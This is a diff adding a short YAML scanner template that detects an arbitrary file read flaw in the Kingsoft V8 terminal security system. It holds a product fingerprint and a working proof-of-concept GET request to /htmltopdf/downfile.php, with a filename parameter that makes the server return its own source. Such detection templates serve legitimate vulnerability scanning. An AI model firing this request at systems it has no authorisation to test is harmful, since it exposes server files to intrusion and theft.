@@ -1,0 +1,19 @@
+name: Kingsoft_V8_Arbitrary_file_read
+transport: http
+set: {}
+detail:
+  dock: app="kingsoft-V8+-Terminal-security-system"
+  product: Kingsoft V8
+  homepage: https://www.ejinshan.net/
+  impact: <p>through which attackers can download arbitrary files from the server<br></p>
+  description: There is an arbitrary file reading vulnerability in Jinshan V8 terminal
+    security system, through which attackers can download arbitrary files from the
+    server
+rules:
+  r1:
+    method: GET
+    path: /htmltopdf/downfile.php?filename=downfile.php
+    follow_redirects: false
+    headers: {}
+    expression: response.status == 200 && response.body.bcontains(b'$filename')
+expression: r1()
